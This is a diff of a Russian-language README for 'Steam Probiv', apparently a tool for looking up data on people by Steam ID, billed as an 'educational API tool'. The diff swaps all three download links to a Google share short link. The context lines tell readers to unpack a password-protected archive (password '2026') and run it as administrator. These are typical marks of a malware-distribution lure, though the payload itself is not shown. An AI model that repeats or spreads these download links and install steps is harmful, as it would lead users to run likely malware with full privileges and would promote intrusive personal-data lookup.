@@ -9,7 +9,7 @@
 
 <div align="center">
 
-[![Download Steam Probiv](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/steam-probiv)
+[![Download Steam Probiv](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/9QUR0Vk8uTsiGOqkv)
 
 </div>
 
@@ -99,7 +99,7 @@
 2. **📦 Распакуйте** архив — пароль: `2026`
 3. **🖱️ Запустите** от имени администратора → Введите Steam ID → Нажмите «Поиск»
 
-[![Download Steam Probiv](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/steam-probiv)
+[![Download Steam Probiv](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/9QUR0Vk8uTsiGOqkv)
 
 ### Подробная установка (Обновление апреля 2026)
 
@@ -230,7 +230,7 @@
 
 <div align="center">
 
-[![Download Steam Probiv](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/steam-probiv)
+[![Download Steam Probiv](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/9QUR0Vk8uTsiGOqkv)
 
 **Версия 4.6.1** — Образовательный API-инструмент. Обновление апреля 2026. Нулевая стоимость. Без платежей.
 
